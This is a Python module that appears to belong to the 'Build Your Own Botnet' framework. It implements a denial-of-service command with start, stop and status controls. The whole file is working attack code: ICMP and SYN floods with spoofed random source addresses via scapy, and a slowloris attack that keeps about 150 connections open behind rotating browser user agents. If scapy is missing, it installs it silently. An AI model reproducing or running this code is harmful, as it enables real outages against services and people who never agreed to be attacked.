#!/usr/bin/python
# -*- coding: utf-8 -*-
'DoS Attack (Build Your Own Botnet)'

# standard library
import os
import base64
import random
import socket
import time
import ssl
import subprocess

# modules
import util

# packages
try:
    from scapy.all import *
except ModuleNotFoundError:
    os.system('python3 -m pip install scapy > /dev/null 2>&1')
finally:
    from scapy.all import *


# globals
command = True
packages = ['util']
platforms = ['linux','linux2']
jobs = []
usage = 'dos <start/stop/status> <ping/syn/slowloris> ip_addr [port] [-https]'
description = """
Start a DoS attack on a target host. 
"""

def random_ip():
    return str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))

def random_port():
    return str(random.randint(1000,50000))

@util.threaded
def icmp_attack(target_ip):
    jobs.append({"method":"ping flood", "ip":target_ip})
    while command:
        packet = IP(src=random_ip() , dst=target_ip)/ICMP()
        send(packet,verbose=False)
        time.sleep(0.01)

@util.threaded
def icmp_attack_noroot(target_ip):
    jobs.append({"method":"ping flood", "ip":target_ip})
    proc = subprocess.Popen(["ping",target_ip,"-i 0.2"], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
    while command:
        time.sleep(5)
    proc.kill()
    proc.wait()


@util.threaded
def syn_attack(target_ip, target_port):
    jobs.append({"method":"syn flood", "ip":target_ip, "port":target_port})
    while command:
        packet = IP(src=random_ip() , dst=target_ip)/TCP(sport=int(random_port()) , dport=int(target_port) , flags="S")
        send(packet,verbose=False)
        time.sleep(0.01)


def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


def init_socket(ip, port = 80, https = False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if https:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=ip)

    s.connect((ip, int(port)))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        ]


@util.threaded
def slowloris_attack(target_ip, target_port, https):
    jobs.append({"method":"slowloris", "ip":target_ip, "port":target_port})
    list_of_sockets = []

    setattr(socket.socket, "send_line", send_line)
    setattr(socket.socket, "send_header", send_header)

    if https:
        setattr(ssl.SSLSocket, "send_line", send_line)
        setattr(ssl.SSLSocket, "send_header", send_header)
    
    for _ in range(150):
        try:
            s = init_socket(target_ip, target_port, https)
        except socket.error as e:
            break
        list_of_sockets.append(s)

    while command:
        for s in list(list_of_sockets):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(150 - len(list_of_sockets)):
            try:
                s = init_socket(target_ip, target_port, https)
                if s:
                    list_of_sockets.append(s)
            except socket.error as e:
                break
        time.sleep(15)


def start(method, target_ip, target_port = None, https = False):
    globals()["command"] = True
    if method == 'ping':
        if util.administrator():
            icmp_attack(target_ip)
            return "attack started"
        else:
            icmp_attack_noroot(target_ip)
            return "the user does not have root permissions, built-in ping program is being used."
    elif method == 'syn':
        if util.administrator():
            syn_attack(target_ip, target_port)
            return "attack started"
        else:
            return "this attack requires root permissions!"
    elif method == 'slowloris':
        slowloris_attack(target_ip, target_port, https)
        return "attack started"
    else:
        return usage


# main
def run(args=None):
    try:
        if args:
            args = str(args).split()
            if args[0] == 'start':
                return start(args[1], *args[2:])
            elif args[0] == 'stop':
                globals()["command"] = False
                globals()["jobs"] = []
                return "attacks stopped"
            elif args[0] == 'status':
                ret_val = ""
                for job in jobs:
                    ret_val += "Attacking " + job["ip"] + " with " + job["method"] +"\n"
                return ret_val

        else:
            return usage
    except Exception as e:
        return "{} error: {}".format(run.__name__, str(e))
